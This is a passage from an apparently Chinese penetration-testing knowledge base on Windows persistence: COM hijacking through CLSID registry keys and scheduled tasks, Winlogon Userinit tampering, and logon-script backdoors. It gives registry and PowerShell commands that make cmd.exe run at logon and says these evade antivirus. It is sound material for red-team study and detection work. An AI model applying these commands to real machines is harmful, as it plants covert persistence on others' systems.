</h3><p>微软在Windows 3.11中引入了(Component Object Model, COM)，作为一种实现对象的方法，这些对象可以被不同的框架(ActiveX, COM+， DCOM等)使用，并且在不同的Windows环境中允许互操作性，进程间通信和代码重用。COM对象的滥用使安防团队能够代表受信任的进程执行任意代码。执行COM劫持不需要管理员权限，因为HKCU注册表配置单元中的类在HKLM中的类之前执行。唯一影响高完整性进程(提升)的例外情况是，仅从HKLM位置加载对象，以防止特权提升。</p>
<p>有多种方法可以执行代码，但有几种情况下，COM已被用于持久性攻击中，进行横向移动和防御规避。根据恶意代码执行的方式，在COM劫持期间会使用各种注册表子项。具体如下所示：</p>
<pre tabindex="0"><code>InprocServer/InprocServer32
LocalServer/LocalServer32
TreatAs
ProgID</code></pre><p>上述子密钥位于以下注册表组中:</p>
<pre tabindex="0"><code>HKEY_CURRENT_USER\Software\Classes\CLSID
HKEY_LOCAL_MACHINE\Software\Classes\CLSID</code></pre><p>发现COM密钥，以进行劫持</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/image-20210707142345792.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210707142345792.png" alt="image-20210707142345792" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210707142345792.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210707142345792.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210707142345792.png?size=large 2x" data-title="image-20210707142345792" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>常见的COM劫持手法有：</p>
<ol>
<li><strong>增加缺少的CLSID进行利用</strong></li>
<li><strong>修改原有CLSID加载的程序</strong></li>
<li><strong>替换掉CLSID下加载路径的程序</strong></li>
</ol>
<p>由David Tulis开发的称为<a href="https://github.com/nccgroup/acCOMplice"target="_blank" rel="external nofollow noopener noreferrer">acCOMplice</a>的PowerShell脚本可以直接检索系统上存在的缺少的库及其CLSID</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/image-20210707142120969.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210707142120969.png" alt="image-20210707142120969" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210707142120969.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210707142120969.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210707142120969.png?size=large 2x" data-title="image-20210707142120969" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h3 id="持久化" class="heading-element"><span>持久化</span>
  <a href="#%e6%8c%81%e4%b9%85%e5%8c%96" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 id="计划任务-1" class="heading-element"><span>计划任务</span>
  <a href="#%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p><a href="https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Get-ScheduledTaskComHandler.ps1"target="_blank" rel="external nofollow noopener noreferrer"><code>Get-ScheduledTaskComHandler</code></a>，该脚本可以检查主机上所有在用户登录时执行并且容易受到COM劫持的预定任务</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">Import-Module</span> .\<span style="color:#58a1dd">Get-ScheduledTaskComHandler</span>.<span style="color:#58a1dd">ps1</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Get-ScheduledTaskComHandler</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/1592231802206110.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/1592231802206110.png" alt="持久性COM劫持的实现" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/1592231802206110.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/1592231802206110.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/1592231802206110.png?size=large 2x" data-title="持久性COM劫持的实现" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>参数“PersistenceLocations”将检索易受COM劫持的计划任务，这些任务可用于持久性且不需要提升的特权。 CLSID和关联的DLL也将显示在输出中。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">Get-ScheduledTaskComHandler</span> <span style="color:#58a1dd">-PersistenceLocations</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/1592231803832859.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/1592231803832859.png" alt="持久性COM劫持的实现" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/1592231803832859.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/1592231803832859.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/1592231803832859.png?size=large 2x" data-title="持久性COM劫持的实现" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>任务“CacheTask”在调用时使用“wininet.dll”并具有以下CLSID：{0358B920-0AC7-461F-98F4-58E32CD89148}</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/1592231803170310.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/1592231803170310.png" alt="持久性COM劫持的实现" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/1592231803170310.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/1592231803170310.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/1592231803170310.png?size=large 2x" data-title="持久性COM劫持的实现" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>调用“ schtasks”实用程序获取存储位置</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">schtasks</span> /<span style="color:#58a1dd">query</span> /<span style="color:#58a1dd">XML</span> /<span style="color:#58a1dd">TN</span> <span style="color:#a6be9d">&#34;\Microsoft\Windows\Wininet\CacheTask&#34;</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/1592231805174725.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/1592231805174725.png" alt="持久性COM劫持的实现" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/1592231805174725.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/1592231805174725.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/1592231805174725.png?size=large 2x" data-title="持久性COM劫持的实现" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h3 id="参考文章" class="heading-element"><span>参考文章</span>
  <a href="#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li><a href="https://www.4hou.com/posts/Mo51"target="_blank" rel="external nofollow noopener noreferrer">持久性COM劫持的实现</a></li>
<li><a href="https://pentestlab.blog/2020/05/20/persistence-com-hijacking/"target="_blank" rel="external nofollow noopener noreferrer">Persistence – COM Hijacking</a></li>
<li><a href="https://422926799.github.io/posts/7dc498ec.html"target="_blank" rel="external nofollow noopener noreferrer">COM劫持学习</a></li>
</ul>
<h1 id="winlogon用户登录初始化" class="heading-element"><span>Winlogon用户登录初始化</span>
  <a href="#winlogon%e7%94%a8%e6%88%b7%e7%99%bb%e5%bd%95%e5%88%9d%e5%a7%8b%e5%8c%96" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>winlogon.exe是windows中非常重要的进程,在用户还没登录系统之前就已经存在,并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon 进程负责将用户配置文件加载到注册表中</p>
<pre tabindex="0"><code>HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code></pre><p>对这些注册表项的恶意修改可能导致 Winlogon 加载和执行恶意 DLL 或可执行文件。</p>
<p>命令行修改</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">delete</span> <span style="color:#a6be9d">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span> /<span style="color:#58a1dd">v</span> <span style="color:#58a1dd">Userinit</span> /<span style="color:#58a1dd">f</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">add</span> <span style="color:#a6be9d">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span>  /<span style="color:#58a1dd">v</span> <span style="color:#a6be9d">&#34;Userinit&#34;</span> /<span style="color:#58a1dd">t</span> <span style="color:#58a1dd">REG_SZ</span> /<span style="color:#58a1dd">d</span> <span style="color:#a6be9d">&#34;C:\Windows\system32\cmd.exe,&#34;</span> /<span style="color:#58a1dd">f</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/640-20210706165717690.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706165717690.png" alt="图片" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706165717690.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706165717690.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706165717690.png?size=large 2x" data-title="图片" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>powershell一句话修改</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">Set-ItemProperty</span>   <span style="color:#a6be9d">&#34;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&#34;</span> <span style="color:#58a1dd">-name</span> <span style="color:#58a1dd">Userinit</span> <span style="color:#58a1dd">-value</span> <span style="color:#a6be9d">&#34;C:\Windows\system32\userinit.exe,C:\Windows\system32\cmd.exe&#34;</span></span></span></code></pre></div><h1 id="logon-scripts后门" class="heading-element"><span>Logon Scripts后门</span>
  <a href="#logon-scripts%e5%90%8e%e9%97%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。</p>
<p>注册表位置:</p>
<pre tabindex="0"><code> HKEY_CURRENT_USER\Environment</code></pre><p>增加键值对</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/640-20210706171727174.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706171727174.png" alt="图片" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706171727174.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706171727174.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706171727174.png?size=large 2x" data-title="图片" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h1 id="文件关联打开方式" class="heading-element"><span>文件关联（打开方式）</span>
  <a href="#%e6%96%87%e4%bb%b6%e5%85%b3%e8%81%94%e6%89%93%e5%bc%80%e6%96%b9%e5%bc%8f" class="heading-mark">
